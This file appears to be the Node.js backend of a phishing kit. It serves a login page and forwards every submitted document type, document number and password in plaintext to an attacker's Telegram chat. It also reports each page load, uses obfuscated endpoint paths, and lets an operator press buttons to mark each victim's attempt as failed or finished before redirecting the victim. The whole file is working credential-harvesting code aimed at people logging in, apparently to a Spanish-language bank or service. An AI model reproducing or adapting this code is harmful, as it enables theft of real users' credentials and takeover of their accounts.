require("dotenv").config();

const path = require("path");
const https = require("https");
const crypto = require("crypto");

const express = require("express");
const { createTelegramManager } = require("./telegram-manager");

const app = express();

const PORT = Number(process.env.PORT || 3000);
const PUBLIC_DIR = path.join(__dirname, "public");
const IS_VERCEL = Boolean(process.env.VERCEL);
const PAGE_LOAD_SIGNAL_PATH = "/api/4d9f6b1e7c2a8f03d5e91ab47c6f2d8841a9b73e5c0f6d2a1b8e4c9f7a63d10e";
const TELEGRAM_WEBHOOK_PATH =
  "/api/telegram-webhook-6b914f0a3d52c7e8f1a4b96d20ce73b4f85a1d29e64c7b03f9d61ae258c470bf";

app.disable("x-powered-by");
app.use(express.urlencoded({ extended: false }));
app.use(express.json({ limit: "10kb" }));
app.use(express.static(PUBLIC_DIR));

const pendingTelegramDecisions = new Map();
const TELEGRAM_ENABLED = Boolean(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID);
const telegram = TELEGRAM_ENABLED
  ? createTelegramManager({ botOptions: { polling: !IS_VERCEL } })
  : null;
let telegramWebhookConfigured = false;

function getRedirectToFromEnv() {
  const raw = String(process.env.redirect_to || "").trim();
  if (!raw) return null;
  if (raw.startsWith("/")) return raw;
  if (/^https?:\/\//i.test(raw)) return raw;
  return null;
}

function finalizePendingDecision({ pending, response, requestId }) {
  if (!pending) return false;
  if (pending.settled) return false;
  pending.settled = true;

  pendingTelegramDecisions.delete(requestId);
  clearTimeout(pending.timeoutId);
  pending.cleanup?.();

  if (!pending.res.headersSent && !pending.res.writableEnded) {
    const payload = { response, requestId };
    if (response === 2) {
      const redirect_to = getRedirectToFromEnv();
      if (redirect_to) payload.redirect_to = redirect_to;
    }

    pending.res.json(payload);
    return true;
  }

  return false;
}

if (telegram) {
  telegram.bot.on("callback_query", async (query) => {
    try {
      const data = String(query.data || "");
      const match = data.match(/^([0-9a-fA-F-]{36}):([12])$/);
      if (!match) return;

      const requestId = match[1];
      const response = Number(match[2]);

      const pending = pendingTelegramDecisions.get(requestId);
      if (!pending) return;

      finalizePendingDecision({ pending, response, requestId });

      if (query.id) {
        await telegram.bot.answerCallbackQuery(query.id).catch(() => {});
      }
    } catch (err) {
      console.error("Telegram callback handling failed:", err);
    }
  });
}

async function ensureTelegramWebhook() {
  if (!telegram || !IS_VERCEL || telegramWebhookConfigured) return;

  const baseUrl = String(process.env.APP_BASE_URL || "").trim().replace(/\/+$/, "");
  if (!baseUrl) return;

  const webhookUrl = `${baseUrl}${TELEGRAM_WEBHOOK_PATH}`;

  try {
    await telegram.bot.setWebHook(webhookUrl);
    telegramWebhookConfigured = true;
  } catch (err) {
    console.error("Telegram webhook setup failed:", err);
  }
}

app.get("/", (req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, "index.html"));
});

app.get("/error", (req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, "error.html"));
});

app.post(TELEGRAM_WEBHOOK_PATH, async (req, res) => {
  if (!telegram) {
    res.sendStatus(204);
    return;
  }

  try {
    await telegram.bot.processUpdate(req.body);
    res.sendStatus(200);
  } catch (err) {
    console.error("Telegram webhook processing failed:", err);
    res.sendStatus(500);
  }
});

app.post(PAGE_LOAD_SIGNAL_PATH, async (req, res) => {
  const isValidPayload = req.body && req.body.hkahx === "P1" && Object.keys(req.body).length === 1;

  if (!isValidPayload) {
    res.status(400).json({ ok: false });
    return;
  }

  if (!telegram) {
    console.warn("Telegram not configured: set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID");
    res.json({ ok: true });
    return;
  }

  try {
    await telegram.sendMessage("P1");
    res.json({ ok: true });
  } catch (err) {
    console.error("Telegram page-load signal failed:", err);
    res.status(500).json({ ok: false });
  }
});

app.post("/api/login", async (req, res) => {
  const requestId = crypto.randomUUID();
  console.log(`POST /api/login [${requestId}] payload:`, req.body);

  const { docType = "", docNumber = "", password = "" } = req.body || {};

  const message =
    "Nuevo intento de login\n" +
    `ID: ${requestId}\n` +
    `Tipo doc: ${docType}\n` +
    `Número doc: ${docNumber}\n` +
    `Contraseña: ${password}`;

  if (!telegram) {
    console.warn("Telegram not configured: set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID");
    res.json({ response: 1, requestId });
    return;
  }

  try {
    await telegram.sendMessageWithButtons(message, [
      [
        { text: "Fallo", callback_data: `${requestId}:1` },
        { text: "Finalizar", callback_data: `${requestId}:2` },
      ],
    ]);
  } catch (err) {
    console.error("Telegram send failed:", err);
    res.json({ response: 1, requestId });
    return;
  }

  const timeoutId = setTimeout(() => {
    const pending = pendingTelegramDecisions.get(requestId);
    if (!pending) return;
    finalizePendingDecision({ pending, response: 1, requestId });
  }, 2 * 60 * 1000);

  const pending = { res, timeoutId, settled: false, cleanup: null };

  const onClose = () => {
    const current = pendingTelegramDecisions.get(requestId);
    if (current !== pending) return;
    finalizePendingDecision({ pending, response: 1, requestId });
  };

  req.on("close", onClose);
  pending.cleanup = () => req.off("close", onClose);

  pendingTelegramDecisions.set(requestId, pending);
});

if (IS_VERCEL) {
  ensureTelegramWebhook();
} else {
  app.listen(PORT, async () => {
    await ensureTelegramWebhook();
    console.log(`Server listening on http://localhost:${PORT}`);
  });
}

module.exports = app;
